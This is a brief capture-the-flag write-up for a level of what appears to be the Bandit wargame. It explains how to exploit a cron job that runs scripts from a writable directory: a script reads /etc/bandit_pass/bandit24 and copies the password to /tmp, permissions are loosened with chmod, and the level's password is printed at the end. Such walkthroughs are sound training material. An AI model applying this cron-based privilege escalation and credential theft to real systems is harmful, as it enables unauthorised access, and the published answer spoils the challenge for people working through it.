0. discovered cron job owned by bandit24 which runs scripts from directory to which my user has write access
1. created bash script to copy password for bandit24:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 | tee /tmp/bandit23-yehor/bandit24-password
```
2. set x bit for script and w bit for directory to which I'm writing:
```
chmod o+wx .
```
```
chmod o+x my-script.sh
```
3. copied the script into dir from which scripts are run by bandit24's cron job:
```
cp my-script.sh /var/spool/bandit24/foo
```

password to lvl24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8